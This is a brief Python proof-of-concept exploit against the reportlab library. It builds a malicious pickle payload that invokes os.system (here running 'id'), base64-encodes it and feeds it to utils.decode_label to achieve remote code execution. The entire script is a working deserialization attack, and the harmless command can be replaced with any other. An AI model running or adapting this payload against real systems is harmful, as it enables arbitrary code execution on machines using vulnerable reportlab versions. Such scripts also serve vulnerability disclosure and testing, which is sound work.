import pickle, base64
from reportlab.lib import utils

# Malicious pickle payload (RCE via os.system)
payload = b"cos\nsystem\n(S'id'\ntR."
encoded = base64.b64encode(payload).decode("latin1")

print("[*] Encoded payload:", encoded)

# Trigger vulnerability
result = utils.decode_label(encoded)
print("[*] RCE Result:", result)
